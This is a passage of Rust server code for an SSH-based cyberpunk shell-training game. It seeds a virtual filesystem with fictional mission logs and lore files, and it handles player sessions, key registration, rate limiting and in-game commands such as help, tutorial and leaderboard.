#![forbid(unsafe_code)]

mod builtins;
mod config;

use std::collections::{BTreeMap, HashMap, HashSet, VecDeque};
use std::net::SocketAddr;
use std::path::Path;
use std::sync::Arc;
use std::time::{Duration, Instant};

use anyhow::{anyhow, Context, Result};
use clap::Parser;
use protocol::Mode;
use russh::keys::ssh_key::rand_core::OsRng;
use russh::server::{self, Msg, Server as _};
use russh::{Channel, ChannelId, CryptoVec};
use shell::{ExecutionContext, ShellEngine};
use sqlx::PgPool;
use ssh_hunt_scripts::{ScriptContext, ScriptEngine, ScriptPolicy};
use tokio::net::TcpListener;
use tokio::time::{sleep, timeout};
use tracing::{error, info, warn};
use ui::{
    key_value_line, lore_message, mission_state_badge, mode_banner_adaptive, mode_switch_banner,
    progress_meter, section_banner_adaptive, Theme, RESET,
};
use uuid::Uuid;
use vfs::Vfs;
use world::{
    AdminSecret, CombatAction, ExperienceTier, HiddenOpsConfig, PlayerProfile, WorldService,
};

#[derive(Debug, Parser)]
struct Args {
    #[arg(long)]
    healthcheck: bool,
}

#[derive(Clone)]
struct AppState {
    cfg: config::ServerConfig,
    world: Arc<WorldService>,
    shell: Arc<ShellEngine>,
    script: Arc<ScriptEngine>,
    admin_secret: Option<AdminSecret>,
}

struct ShellState {
    vfs: Vfs,
    cwd: String,
    user: String,
    node: String,
    env: HashMap<String, String>,
    last_exit: i32,
    /// Command history for the current session (newest last).
    history: Vec<String>,
    /// Tracks which commands the player has successfully executed (for mission validation).
    /// Maps command prefix → last stdout output.
    command_log: HashMap<String, String>,
}

impl ShellState {
    fn bootstrap(prompt_user: &str) -> Self {
        let mut vfs = Vfs::default();
        let _ = vfs.mkdir_p("/", "home", "system");
        let _ = vfs.mkdir_p("/", "tmp", "system");
        let _ = vfs.mkdir_p("/", "logs", "system");
        let _ = vfs.mkdir_p("/", "missions", "system");
        let _ = vfs.mkdir_p("/", "home/player", "player");
        let _ = vfs.mkdir_p("/", "data", "system");
        let _ = vfs.mkdir_p("/", "data/lore", "system");
        let _ = vfs.mkdir_p("/", "data/reports", "system");
        let _ = vfs.mkdir_p("/", "var/spool", "system");

        let _ = vfs.write_file(
            "/",
            "/missions/readme.txt",
            "RUN ORDER\n1. tutorial start\n2. briefing\n3. missions\n4. accept keys-vault\n5. cat /missions/rookie-ops.txt\n\nIN-WORLD FILES\n- /missions/rookie-ops.txt\n- /missions/story-so-far.txt\n- /data/lore/ghost-rail-dossier.txt\n",
            false,
            "system",
        );

        let _ = vfs.write_file(
            "/",
            "/missions/rookie-ops.txt",
            "ROOKIE FIELD GUIDE\npwd                         -> show where you are\nls /logs                    -> list available files\ncat FILE                    -> read a file\ngrep token FILE             -> show only matching lines\ncat FILE | grep token       -> send one command into the next\ngrep token FILE > /tmp/out  -> save output to a scratch file\necho $?                     -> show whether the last command worked (0 means success)\n\nIf a long command feels confusing, run the left part first, then add the next piece.\n",
            false,
            "system",
        );

        let _ = vfs.write_file(
            "/",
            "/missions/story-so-far.txt",
            "Three nights ago Ghost Rail lost sync with the rest of NetCity.\nCorpSim calls this place a training sim, but the logs say the outage is real.\nA repeated beacon, GLASS-AXON-13, keeps surfacing in gateway traffic.\nVault-sat-9 went dark minutes later.\nYour onboarding contract is simple: learn the shell, secure your own access key, and rebuild the story before the corps rewrite it for you.\n",
            false,
            "system",
        );

        // Core log file used by training missions
        let _ = vfs.write_file(
            "/",
            "/logs/neon-gateway.log",
            "[INFO] token=GLASS-AXON-13\n[WARN] sector drift\n[INFO] token=GLASS-AXON-13\n[ERROR] node=vault-sat-9 unreachable\n[INFO] token=GLASS-AXON-13\n[WARN] packet loss\n",
            false,
            "system",
        );

        // awk-patrol mission: structured data for field extraction
        let _ = vfs.write_file(
            "/",
            "/data/node-registry.csv",
            "node_id,sector,status,latency_ms\ncorp-sim-01,training,online,12\nneon-bazaar-gw,market,online,88\nghost-rail,transit,degraded,142\nvault-sat-9,secure,offline,0\ndark-mirror,redline,online,33\n",
            false,
            "system",
        );

        // chain-ops mission: conditional logic drill
        let _ = vfs.write_file(
            "/",
            "/var/spool/tasks.txt",
            "OPEN: deploy neon-proxy\nDONE: patch vault-sat-9\nOPEN: audit ghost-rail\nDONE: sweep dark-mirror\nOPEN: recover corp-sim-01\n",
            false,
            "system",
        );

        // sediment mission: stream editing log file
        let _ = vfs.write_file(
            "/",
            "/logs/access.log",
            "2026-03-07 22:01:03 ALLOW corp-sim-01 443\n2026-03-07 22:01:17 DENY ghost-rail 8080\n2026-03-07 22:02:44 ALLOW neon-bazaar-gw 443\n2026-03-07 22:03:01 DENY vault-sat-9 22\n2026-03-07 22:04:12 ALLOW dark-mirror 443\n",
            false,
            "system",
        );

        // Extra lore file for exploration
        let _ = vfs.write_file(
            "/",
            "/data/reports/q1-summary.txt",
            "// NEON GRID QUARTERLY REPORT Q1-2026\n// Classification: INTERNAL\nNode uptime: 94.2%\nIncidents: 3 (all ghost-rail sector)\nRevenue: 8,420,000 Neon Chips\nTop operative: ??? (alias redacted)\n",
            false,
            "system",
        );

        let _ = vfs.write_file(
            "/",
            "/data/lore/ghost-rail-dossier.txt",
            "GHOST RAIL DOSSIER\nSector role: freight, relays, maintenance crews\nIncident: cascading outage after unauthorized key use\nLast clean signal: token GLASS-AXON-13 observed on neon-gateway\nPrimary concern: vault-sat-9 remains offline after the rail blackout\nUnofficial note: recruits who solve the training board are being folded into the live repair effort\n",
            false,
            "system",
        );

        let _ = vfs.write_file(
            "/",
            "/data/lore/field-manual.txt",
            "FIELD MANUAL // SHELL HABITS\n- Read first, modify second.\n- Save scratch output under /tmp when you want to inspect it later.\n- Build long pipelines in pieces.\n- grep narrows data. wc counts it. sort and uniq clean it.\n- When you get lost, run pwd, then ls.\n",
            false,
            "system",
        );

        let _ = vfs.write_file(
            "/",
            "/data/lore/netcity-fragment.txt",
            "NETCITY FRAGMENT\nThe market districts think Ghost Rail was sabotage.\nThe security districts think it was an inside key leak.\nThe couriers think CorpSim already knows the answer and is training replacements before the blame lands.\n",
            false,
            "system",
        );

        // cut-lab mission: tab-delimited inventory for field extraction
        let _ = vfs.write_file(
            "/",
            "/data/inventory.tsv",
            "item\tsku\tqty\tprice\nNeon Blade\tnb-001\t12\t450\nGhost Rail Pass\tgrp-002\t3\t1200\nVault Key\tvk-003\t1\t8800\nShadow Lens\tsl-004\t7\t320\nCyber Patch Kit\tcpk-005\t44\t80\n",
            false,
            "system",
        );

        // pattern-sweep mission: auth log with varied ACCEPT/REJECT events
        let _ = vfs.write_file(
            "/",
            "/var/log/auth.log",
            "2026-03-07 21:58:01 ACCEPT user=neo src=10.77.1.2\n2026-03-07 21:58:33 REJECT user=ghost src=10.77.9.9\n2026-03-07 21:59:00 ACCEPT user=neo src=10.77.1.2\n2026-03-07 21:59:12 ACCEPT user=rift src=10.77.3.7\n2026-03-07 21:59:44 REJECT user=shadow src=10.77.9.9\n2026-03-07 22:00:01 REJECT user=anon src=10.77.9.9\n",
            false,
            "system",
        );

        // Lore/environment files for new missions
        let _ = vfs.write_file("/", "/etc/hostname", "corp-sim-01\n", false, "system");
        let _ = vfs.write_file(
            "/",
            "/etc/hosts",
            "127.0.0.1 localhost\n10.77.0.15 corp-sim-01\n10.77.1.2 neon-bazaar-gw\n10.77.3.7 ghost-rail\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/var/log/syslog",
            "2026-03-07 22:00:01 corp-sim-01 kernel: eth0 link up\n2026-03-07 22:00:05 corp-sim-01 sshd: Accepted publickey for neo\n2026-03-07 22:01:00 corp-sim-01 cron: running daily sweep\n2026-03-07 22:02:14 corp-sim-01 kernel: WARNING: vault-sat-9 unreachable\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/home/player/notes.txt",
            "# Operative Notes\nTarget: vault-sat-9\nStatus: offline\nNext step: check ghost-rail sector logs\nTip: use grep -i for case-insensitive search\n",
            false,
            "player",
        );

        let _ = vfs.write_file(
            "/",
            "/home/player/journal.txt",
            "DAY 0 // FIRST LOGIN\nCorpSim says onboarding.\nThe files say emergency response.\nStart with /missions/rookie-ops.txt if your shell muscle memory is rusty.\nIf you want the bigger picture, read /missions/story-so-far.txt and /data/lore/ghost-rail-dossier.txt.\n",
            false,
            "player",
        );

        // file-ops mission: a nested workspace directory to copy/move/remove
        let _ = vfs.mkdir_p("/", "data/workspace", "system");
        let _ = vfs.write_file(
            "/",
            "/data/workspace/config.txt",
            "mode=stealth\ntimeout=30\nretries=3\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/data/workspace/manifest.txt",
            "version=2.1\nauthor=netrunner\ntarget=vault-sat-9\n",
            false,
            "system",
        );

        // regex-hunt mission: log with mixed patterns for grep -E exercises
        let _ = vfs.write_file(
            "/",
            "/var/log/events.log",
            "2026-03-07 22:10:01 ERROR user=neo code=ERR-001\n2026-03-07 22:10:14 WARN  user=rift code=WRN-007\n2026-03-07 22:11:00 INFO  user=neo code=INF-042\n2026-03-07 22:11:22 ERROR user=ghost code=ERR-002\n2026-03-07 22:12:05 FATAL user=shadow code=FAT-001\n2026-03-07 22:12:44 INFO  user=neo code=INF-099\n2026-03-07 22:13:01 WARN  user=anon code=WRN-003\n",
            false,
            "system",
        );

        // pipeline-pro mission: multi-column data requiring chained transforms
        let _ = vfs.write_file(
            "/",
            "/data/pipeline.csv",
            "id,name,score,rank\n101,neo,9800,1\n202,rift,8700,2\n303,shadow,7500,3\n404,ghost,6200,4\n505,anon,5100,5\n606,cipher,4300,6\n",
            false,
            "system",
        );

        // var-play mission: config file with KEY=value pairs to manipulate
        let _ = vfs.write_file(
            "/",
            "/etc/sim-config",
            "MODE=stealth\nTIMEOUT=30\nRETRIES=3\nTARGET=vault-sat-9\nDEBUG=false\nSECTOR=ghost-rail\n",
            false,
            "system",
        );

        // json-crack mission: JSON-like object with nested key-value data
        let _ = vfs.write_file(
            "/",
            "/data/node-status.json",
            "{\n  \"node\": \"vault-sat-9\",\n  \"status\": \"offline\",\n  \"sector\": \"secure\",\n  \"latency\": 0,\n  \"owner\": \"corp-admin\",\n  \"alert\": \"CRITICAL\"\n}\n",
            false,
            "system",
        );

        // seq-master mission: a list of task labels (player adds numbers via seq/nl)
        let _ = vfs.write_file(
            "/",
            "/home/player/tasks.txt",
            "deploy-proxy\nauditor-scan\nrecover-node\npatch-vault\nsweep-sector\n",
            false,
            "player",
        );

        // column-view mission: tab-delimited network status table
        let _ = vfs.write_file(
            "/",
            "/data/netmap.tsv",
            "NODE\tSECTOR\tSTATUS\tLATENCY\ncorp-sim-01\ttraining\tonline\t12ms\nneon-bazaar-gw\tmarket\tonline\t88ms\nghost-rail\ttransit\tdegraded\t142ms\nvault-sat-9\tsecure\toffline\t-\ndark-mirror\tredline\tonline\t33ms\n",
            false,
            "system",
        );

        // deep-pipeline mission: blackbox log with mixed severity and sectors
        let _ = vfs.write_file(
            "/",
            "/logs/blackbox.log",
            "2084-03-12T08:14:22 INFO sector-3 heartbeat normal\n\
             2084-03-12T08:14:23 WARN sector-7 latency spike detected\n\
             2084-03-12T08:14:24 CRITICAL sector-7 vault-sat-9 unreachable\n\
             2084-03-12T08:14:25 INFO sector-1 routine sweep pass\n\
             2084-03-12T08:14:26 CRITICAL sector-7 failover timeout exceeded\n\
             2084-03-12T08:14:27 ERROR sector-4 relay buffer overflow\n\
             2084-03-12T08:14:28 CRITICAL sector-7 encrypted tunnel collapsed\n\
             2084-03-12T08:14:29 WARN sector-2 backup power fluctuation\n\
             2084-03-12T08:14:30 CRITICAL sector-9 signal intercept detected\n\
             2084-03-12T08:14:31 INFO sector-7 recovery attempt initiated\n\
             2084-03-12T08:14:32 CRITICAL sector-7 recovery failed — no quorum\n\
             2084-03-12T08:14:33 ERROR sector-7 cascade failure propagating\n\
             2084-03-12T08:14:34 CRITICAL sector-3 secondary relay offline\n\
             2084-03-12T08:14:35 CRITICAL sector-7 all nodes dark\n",
            false,
            "system",
        );

        // log-forensics mission: add IPs to auth.log and access.log entries
        // (The existing files have entries; we add IP-bearing lines for cross-referencing)
        let _ = vfs.write_file(
            "/",
            "/var/log/auth-ips.log",
            "ACCEPT user=admin src=10.0.7.11 port=22\n\
             REJECT user=root src=10.0.9.44 port=22\n\
             REJECT user=admin src=10.0.7.11 port=22\n\
             ACCEPT user=deploy src=10.0.3.8 port=22\n\
             REJECT user=scanner src=10.0.5.22 port=22\n\
             REJECT user=root src=10.0.9.44 port=22\n\
             REJECT user=probe src=10.0.7.11 port=22\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/logs/access-ips.log",
            "ALLOW path=/api/health src=10.0.3.8\n\
             DENY path=/admin/keys src=10.0.7.11\n\
             ALLOW path=/api/status src=10.0.1.5\n\
             DENY path=/vault/unlock src=10.0.9.44\n\
             DENY path=/admin/config src=10.0.7.11\n\
             ALLOW path=/api/health src=10.0.2.3\n\
             DENY path=/vault/dump src=10.0.5.22\n",
            false,
            "system",
        );

        // data-transform mission: supply manifest CSV
        let _ = vfs.write_file(
            "/",
            "/data/supply-manifest.csv",
            "id,item,quantity,status\n\
             1,power-cells,847,available\n\
             2,relay-boards,23,critical\n\
             3,fiber-cables,1200,available\n\
             4,cooling-units,5,critical\n\
             5,backup-drives,312,available\n\
             6,encryption-chips,89,low\n\
             7,antenna-arrays,42,low\n\
             8,shielding-plates,1500,available\n\
             9,servo-motors,15,critical\n\
             10,display-panels,200,available\n",
            false,
            "system",
        );

        // sort-count mission: signal feed with repeated node checkins
        let _ = vfs.write_file(
            "/",
            "/data/signal-feed.txt",
            "neon-bazaar\n\
             ghost-rail\n\
             corp-sim-01\n\
             ghost-rail\n\
             vault-sat-9\n\
             neon-bazaar\n\
             ghost-rail\n\
             dark-mirror\n\
             corp-sim-01\n\
             ghost-rail\n\
             neon-bazaar\n\
             vault-sat-9\n\
             ghost-rail\n\
             corp-sim-01\n\
             dark-mirror\n\
             ghost-rail\n\
             neon-bazaar\n\
             ghost-rail\n\
             crystal-array\n\
             ghost-rail\n",
            false,
            "system",
        );

        // process-hunt mission: simulated process table
        let _ = vfs.write_file(
            "/",
            "/data/proc-table.txt",
            "USER       PID  %CPU %MEM COMMAND\nroot         1   0.0  0.1 /sbin/init\nrelay      142   4.2  1.3 /opt/relay/relay-daemon --sector=ghost-rail\nrelay      187   8.7  2.1 /opt/relay/relay-daemon --sector=neon-bazaar\ncron       201   0.0  0.0 /usr/sbin/cron\nroot       288   0.1  0.2 /usr/sbin/sshd\nrelay      312  92.4 14.8 /opt/relay/relay-daemon --sector=vault-sat-9 --mode=recovery\nlogd       401   0.3  0.1 /usr/bin/logd --rotate=daily\nroot       455   0.0  0.0 /bin/bash\n",
            false,
            "system",
        );

        // cron-decode mission: crontab with scheduled jobs
        let _ = vfs.write_file(
            "/",
            "/data/crontab.txt",
            "# MIN HOUR DOM MON DOW COMMAND\n0 0 * * * /opt/scripts/daily-backup.sh\n30 1 * * * /opt/scripts/log-rotate.sh\n0 3 * * * /opt/scripts/sweep-sector.sh --mode=deep\n15 6 * * 1 /opt/scripts/weekly-audit.sh\n*/5 * * * * /opt/scripts/heartbeat.sh\n0 12 * * * /opt/scripts/noon-report.sh\n0 3 * * 5 /opt/scripts/friday-sweep.sh --full\n",
            false,
            "system",
        );

        // permission-audit mission: files with varying permissions
        let _ = vfs.mkdir_p("/", "data/configs", "system");
        let _ = vfs.write_file(
            "/",
            "/data/configs/relay.conf",
            "sector=ghost-rail\nmode=active\nport=8443\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/data/configs/vault.conf",
            "sector=secure\nmode=locked\nport=9443\n",
            false,
            "system",
        );

        // escape-room mission: chained clue files
        let _ = vfs.mkdir_p("/", "data/drops", "system");
        let _ = vfs.write_file(
            "/",
            "/missions/escape-start.txt",
            "DEAD DROP PROTOCOL INITIATED\nThe first fragment is hidden in the data directory.\nNEXT: /data/drops/fragment-1.txt\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/data/drops/fragment-1.txt",
            "FRAGMENT 1 OF 3\nGhost Rail relay logs mention a second drop.\nLook for the pattern: the path is always one level deeper.\nNEXT: /data/drops/fragment-2.txt\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/data/drops/fragment-2.txt",
            "FRAGMENT 2 OF 3\nThe final piece is where operatives keep their notes.\nNEXT: /home/player/fragment-3.txt\n",
            false,
            "system",
        );
        let _ = vfs.write_file(
            "/",
            "/home/player/fragment-3.txt",
            "FRAGMENT 3 OF 3\nAll fragments collected.\nFINAL CODE: ESCAPE-GHOST-RAIL-7X\nSubmit the mission now.\nESCAPE\n",
            false,
            "player",
        );

        // incident-report mission: additional time-stamped events
        let _ = vfs.write_file(
            "/",
            "/var/log/incident.log",
            "2026-03-07 21:55:00 [auth] ACCEPT user=deploy src=10.0.3.8\n2026-03-07 21:57:22 [auth] REJECT user=probe src=10.0.7.11\n2026-03-07 21:58:01 [access] DENY path=/vault/unlock src=10.0.9.44\n2026-03-07 21:59:15 [access] ALLOW path=/api/health src=10.0.3.8\n2026-03-07 22:00:00 [event] CRITICAL vault-sat-9 unreachable\n2026-03-07 22:00:30 [auth] REJECT user=root src=10.0.9.44\n2026-03-07 22:01:01 [event] ERROR ghost-rail cascade failure\n",
            false,
            "system",
        );

        let cwd = "/home/player".to_owned();
        let node = "corp-sim-01".to_owned();
        let mut env = HashMap::new();
        env.insert("USER".to_owned(), prompt_user.to_owned());
        env.insert("HOME".to_owned(), "/home/player".to_owned());
        env.insert("PWD".to_owned(), cwd.clone());
        env.insert("PATH".to_owned(), "/bin:/usr/bin".to_owned());
        env.insert("?".to_owned(), "0".to_owned());

        Self {
            vfs,
            cwd,
            user: prompt_user.to_owned(),
            node,
            env,
            last_exit: 0,
            history: Vec::new(),
            command_log: HashMap::new(),
        }
    }

    fn prompt(&self) -> String {
        format!("{}@{}:{}$ ", self.user, self.node, self.cwd)
    }

    fn execute_shell(&mut self, engine: &ShellEngine, line: &str) -> Result<shell::CommandResult> {
        let mut ctx = ExecutionContext {
            vfs: &mut self.vfs,
            cwd: self.cwd.clone(),
            user: self.user.clone(),
            node: self.node.clone(),
            env: self.env.clone(),
            last_exit: self.last_exit,
        };

        let result = engine.execute(&mut ctx, line)?;
        self.cwd = ctx.cwd;
        self.env = ctx.env;
        self.last_exit = result.exit_code;
        Ok(result)
    }
}

#[derive(Clone)]
struct GameServer {
    app: Arc<AppState>,
}

struct GameSession {
    app: Arc<AppState>,
    peer_addr: Option<SocketAddr>,
    username: String,
    offered_fingerprints: Vec<String>,
    player_id: Option<Uuid>,
    profile: Option<PlayerProfile>,
    shell_state: Option<ShellState>,
    mode: Mode,
    flash_enabled: bool,
    line_buffer: Vec<u8>,
    pending_keyvault: bool,
    pending_admin_passphrase: bool,
    current_duel: Option<Uuid>,
    redline_until: Option<Instant>,
    script_cooldown_until: Option<Instant>,
    command_window: VecDeque<Instant>,
    supports_ansi: bool,
    supports_unicode: bool,
    pending_lf_after_cr: bool,
    escape_sequence_remaining: u8,
    pty_columns: u32,
}

impl GameSession {
    fn new(app: Arc<AppState>, peer_addr: Option<SocketAddr>) -> Self {
        Self {
            app,
            peer_addr,
            username: "guest".to_owned(),
            offered_fingerprints: Vec::new(),
            player_id: None,
            profile: None,
            shell_state: None,
            mode: Mode::Training,
            flash_enabled: true,
            line_buffer: Vec::new(),
            pending_keyvault: false,
            pending_admin_passphrase: false,
            current_duel: None,
            redline_until: None,
            script_cooldown_until: None,
            command_window: VecDeque::new(),
            supports_ansi: true,
            supports_unicode: true,
            pending_lf_after_cr: false,
            escape_sequence_remaining: 0,
            pty_columns: 80,
        }
    }

    async fn initialize_identity(&mut self) -> Result<()> {
        let remote_ip = self
            .peer_addr
            .map(|ip| ip.ip().to_string())
            .unwrap_or_else(|| "0.0.0.0".to_owned());
        let profile = self
            .app
            .world
            .login(&self.username, &remote_ip, &self.offered_fingerprints)
            .await?;

        self.player_id = Some(profile.id);
        self.mode = Mode::Training;
        self.flash_enabled = self.app.cfg.ui.flash_default;
        self.shell_state = Some(ShellState::bootstrap(&sanitize_prompt_user(
            &profile.username,
        )));
        self.profile = Some(profile.clone());

        if let Some(secret) = &self.app.admin_secret {
            if self
                .app
                .world
                .is_super_admin_candidate(&profile.username, &remote_ip, secret)
                .await
                && secret.auto_keygen_on_first_login
                && profile.registered_key_fingerprints.is_empty()
            {
                self.pending_admin_passphrase = true;
            }
        }

        Ok(())
    }

    fn enforce_rate_limit(&mut self) -> bool {
        let now = Instant::now();
        while self
            .command_window
            .front()
            .is_some_and(|t| now.duration_since(*t) > Duration::from_secs(1))
        {
            self.command_window.pop_front();
        }

        if self.command_window.len() >= self.app.cfg.server.burst as usize {
            return false;
        }

        self.command_window.push_back(now);
        true
    }

    async fn run_line(&mut self, line: &str) -> Result<(String, i32, bool)> {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            return Ok((String::new(), 0, false));
        }
        if trimmed == "exit" || trimmed == "logout" {
            return Ok(("Session closed.\n".to_owned(), 0, true));
        }

        if let Some(player_id) = self.player_id {
            if let Some(profile) = self.app.world.get_player(player_id).await {
                if profile.banned {
                    return Ok(("Account zeroed. Session terminated.\n".to_owned(), 1, true));
                }
            }
        }

        if self.pending_admin_passphrase {
            self.pending_admin_passphrase = false;
            let (pub_line, private_blob) = generate_admin_keypair(trimmed)?;
            if let Some(pid) = self.player_id {
                let _ = self.app.world.register_key(pid, &pub_line).await;
            }
            return Ok((
                format!(
                    "Admin bootstrap key generated (one-time reveal).\nStore this encrypted private key offline:\n{}\nPublic key registered: {}\n",
                    private_blob, pub_line
                ),
                0,
                false,
            ));
        }

        if self.pending_keyvault {
            self.pending_keyvault = false;
            if let Some(pid) = self.player_id {
                match self.app.world.register_key(pid, trimmed).await {
                    Ok(fp) => {
                        return Ok((
                            format!(
                                "Key registered. Fingerprint {}\nTraining access + multiplayer trust path improved.\n",
                                fp
                            ),
                            0,
                            false,
                        ));
                    }
                    Err(err) => {
                        return Ok((format!("Key registration failed: {err}\n"), 1, false));
                    }
                }
            }
        }

        if !self.enforce_rate_limit() {
            return Ok((
                "Rate limit exceeded. Slow down to avoid defensive lockouts.\n".to_owned(),
                1,
                false,
            ));
        }

        if let Some(until) = self.redline_until {
            if Instant::now() > until {
                self.mode = Mode::Training;
                self.redline_until = None;
                if let Some(pid) = self.player_id {
                    let _ = self
                        .app
                        .world
                        .mode_switch(pid, Mode::Training, Some(self.flash_enabled))
                        .await;
                }
                return Ok((
                    "REDLINE timer expired. Returning to Training Sim.\n".to_owned(),
                    0,
                    false,
                ));
            }
        }

        let cmd = trimmed.split_whitespace().next().unwrap_or_default();
        if is_game_command(cmd) {
            return self.run_game_command(trimmed).await;
        }
        if let Some(reason) = escape_attempt_reason(trimmed) {
            if let Some(player_id) = self.player_id {
                let _ = self
                    .app
                    .world
                    .ban_forever(player_id, reason, "auto-warden")
                    .await;
            }
            return Ok((
                format!(
                    "INTRUSION DETECTED: {reason}\nAccount zeroed permanently. Connection terminated.\n"
                ),
                126,
                true,
            ));
        }

        let (res, parsed) = {
            let shell = self
                .shell_state
                .as_mut()
                .ok_or_else(|| anyhow!("session shell unavailable"))?;
            let parsed = self.app.shell.parse(trimmed, &shell.env).ok();
            let res = shell.execute_shell(&self.app.shell, trimmed)?;
            // Record command history and output for mission validation
            shell.history.push(trimmed.to_owned());
            if shell.history.len() > 500 {
                shell.history.remove(0);
            }
            if res.exit_code == 0 && !res.stdout.is_empty() {
                shell
                    .command_log
                    .insert(trimmed.to_owned(), res.stdout.clone());
            }
            // Write history to VFS so the `history` builtin can read it
            let hist_content = shell
                .history
                .iter()
                .enumerate()
                .map(|(i, cmd)| format!("  {}  {}", i + 1, cmd))
                .collect::<Vec<_>>()
                .join("\n");
            let _ = shell
                .vfs
                .write_file("/", "/tmp/.history", &hist_content, false, "system");
            (res, parsed)
        };

        let mut combined = String::new();
        if !res.stdout.is_empty() {
            combined.push_str(&res.stdout);
            if !combined.ends_with('\n') {
                combined.push('\n');
            }
        }
        if !res.stderr.is_empty() {
            combined.push_str(&res.stderr);
            if !combined.ends_with('\n') {
                combined.push('\n');
            }
        }

        if res.exit_code == 0 {
            if let Some((pipeline_depth, unique_tools)) = parsed.as_ref().and_then(style_metrics) {
                if let Some(player_id) = self.player_id {
                    let reward = self
                        .app
                        .world
                        .style_bonus(player_id, pipeline_depth, unique_tools)
                        .await?;
                    if reward > 0 {
                        combined.push_str(&format!(
                            "[style bonus] +{reward} Neon Chips (chain={pipeline_depth}, tools={unique_tools})\n"
                        ));
                    }
                }
            }
        }

        Ok((combined, res.exit_code, false))
    }

    async fn run_game_command(&mut self, line: &str) -> Result<(String, i32, bool)> {
        let mut parts = line.split_whitespace();
        let cmd = parts.next().unwrap_or_default();
        let args = parts.collect::<Vec<_>>();
        let player_id = self.player_id.ok_or_else(|| anyhow!("no player id"))?;

        match cmd {
            "help" => {
                let theme = Theme::for_mode(self.mode.clone());
                let mut out = self.render_section_banner("COMMAND MATRIX");
                out.push_str(&format!(
                    "{}Quickstart{} tutorial start -> briefing -> missions -> gate -> mode netcity\n",
                    theme.accent, RESET
                ));
                out.push('\n');
                out.push_str("Core      help guide briefing tutorial missions accept submit mode gate keyvault status events leaderboard daily tier\n");
                out.push_str("Social    chat party mail\n");
                out.push_str("Economy   inventory shop auction\n");
                out.push_str("Scripts   scripts market | scripts run <name>\n");
                out.push_str(
                    "PvP       pvp roster | pvp challenge <username> | pvp attack|defend|script\n",
                );
                out.push('\n');
                out.push_str("Rules\n");
                out.push_str("  - Hardcore: 3 deaths = ZEROED (account locked)\n");
                out.push_str("  - Host escape/probing attempts = PERMA-ZERO + disconnect\n");
                out.push('\n');
                out.push_str("Need step-by-step onboarding? Run: guide\n");
                out.push_str("Need bash fundamentals? Run: guide shell\n");
                out.push_str("Need story + mission hints? Run: briefing [mission-code]\n");
                Ok((out, 0, false))
            }
            "guide" => {
                if args.is_empty() || args.first() == Some(&"quick") {
                    return Ok((self.quickstart_guide(), 0, false));
                }
                if matches!(args.first(), Some(&"shell") | Some(&"bash")) {
                    return Ok((self.shell_survival_guide(), 0, false));
                }
                if args.first() == Some(&"full") {
                    return Ok((self.full_gameplay_guide(), 0, false));
                }
                Ok(("Usage: guide [quick|full|shell]\n".to_owned(), 1, false))
            }
            "briefing" => {
                if args.is_empty() {
                    return Ok((self.story_briefing(), 0, false));
                }

                let code = args[0];
                let detail = self
                    .app
                    .world
                    .mission_detail_for_player(player_id, code)
                    .await?;
                Ok((self.render_mission_briefing(&detail), 0, false))
            }
            "gate" => {
                let gate = self
                    .app
                    .world
                    .netcity_gate_reason(player_id, &self.offered_fingerprints)
                    .await?;
                let out = if let Some(reason) = gate {
                    let mut msg = self.render_section_banner("NETCITY GATE // LOCKED");
                    msg.push_str(&key_value_line(self.mode.clone(), "Reason", &reason));
                    msg.push('\n');
                    msg.push_str("Unlock checklist\n");
                    msg.push_str("  [ ] keyvault register\n");
                    msg.push_str("  [ ] submit keys-vault\n");
                    msg.push_str(
                        "  [ ] submit one starter mission (pipes-101|finder|redirect-lab|log-hunt|dedupe-city)\n",
                    );
                    msg.push_str("  [ ] reconnect with registered SSH key\n");
                    msg
                } else {
                    let mut msg = self.render_section_banner("NETCITY GATE // UNLOCKED");
                    msg.push_str("Use: mode netcity\n");
                    msg
                };
                Ok((out, 0, false))
            }
            "leaderboard" => {
                let requested = args
                    .first()
                    .and_then(|raw| raw.parse::<usize>().ok())
                    .unwrap_or(10);
                let entries = self.app.world.leaderboard_snapshot(requested).await;
                let mut out = self.render_section_banner("LEADERBOARD");
                out.push_str("RANK  PLAYER                    REP   WALLET   ACH\n");
                for (idx, entry) in entries.iter().enumerate() {
                    let rank = idx + 1;
                    let rank_label = if rank <= 9 {
                        format!("0{rank}")
                    } else {
                        rank.to_string()
                    };
                    out.push_str(&format!(
                        "{:<5} {:<25} {:<5} {:<8} {}\n",
                        rank_label,
                        entry.display_name,
                        entry.reputation,
                        entry.wallet,
                        entry.achievements
                    ));
                }
                Ok((out, 0, false))
            }
            "tutorial" => {
                if args.first() == Some(&"start") {
                    let mut out = self.render_section_banner("TUTORIAL START");
                    out.push_str("Prompt format: <username>@<node>:/path$\n");
                    out.push('\n');
                    out.push_str("Shell basics\n");
                    out.push_str("  pwd                         # where am I?\n");
                    out.push_str("  ls /logs                    # what files exist?\n");
                    out.push_str("  cat /logs/neon-gateway.log  # read a file\n");
                    out.push('\n');
                    out.push_str("Beginner drills\n");
                    out.push_str("  cat /logs/neon-gateway.log | grep token | wc -l\n");
                    out.push_str("  grep token /logs/neon-gateway.log > /tmp/tokens.txt\n");
                    out.push_str("  cat /tmp/tokens.txt\n");
                    out.push('\n');
                    out.push_str("KEYS VAULT mission (required)\n");
                    out.push_str("  ssh-keygen -t ed25519 -a 64 -f ~/.ssh/ssh-hunt_ed25519\n");
                    out.push_str("  keyvault register\n");
                    out.push('\n');
                    out.push_str("Story hook\n");
                    out.push_str("  Ghost Rail went dark, vault-sat-9 stopped answering, and the beacon GLASS-AXON-13 is still repeating.\n");
                    out.push_str("  Read more with: briefing\n");
                    out.push_str("  Learn the shell with: guide shell\n");
                    out.push('\n');
                    out.push_str("In-world help files\n");
                    out.push_str("  cat /missions/rookie-ops.txt\n");
                    out.push_str("  cat /missions/story-so-far.txt\n");
                    out.push_str("  cat /home/player/journal.txt\n");
                    out.push('\n');
                    out.push_str("Host breakout/probing attempts are auto-zeroed permanently.\n");
                    out.push_str("Complete one starter mission to unlock NetCity.\n");
                    Ok((out, 0, false))
                } else {
                    Ok(("Usage: tutorial start\n".to_owned(), 1, false))
                }
            }
            "missions" => {
                let missions = self.app.world.mission_statuses(player_id).await?;
